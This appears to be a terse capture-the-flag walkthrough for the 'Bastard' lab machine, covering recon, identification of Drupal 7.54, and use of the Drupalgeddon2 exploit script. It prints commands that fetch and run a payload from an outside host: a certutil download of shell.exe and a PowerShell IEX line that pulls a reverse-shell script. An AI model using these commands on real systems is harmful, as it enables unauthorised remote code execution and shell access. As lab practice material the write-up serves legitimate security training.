# Bastard

## Recon

Starting with recon:

```sh
sudo autorecon 10.10.10.9
```

## Enumeration

- `Drupal 7.54` on port 80


## Exploit

Drupalgeddon2 the ruby script works from `searchsploit`

```sh
searchsploit -m 44449.rb
```

and when running this, we get a warning about a shebang error, so we use dos2unix to fix this.

```sh
dos2unix 44449.rb
```

and finally fire off the exploit:

```sh
ruby 44449.rb
```

```sh
certutil.exe -urlcache -split -f "http://192.168.72.128/shell.exe" "C:\inetpub\drupal-7.54\shell.exe"
```

URI encoded:

```sh
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.72.128/mini-reverse.ps1')
```

powershell iex(new-object net.webclient).downloadstring('http://192.168.72.128/mini-reverse.ps1')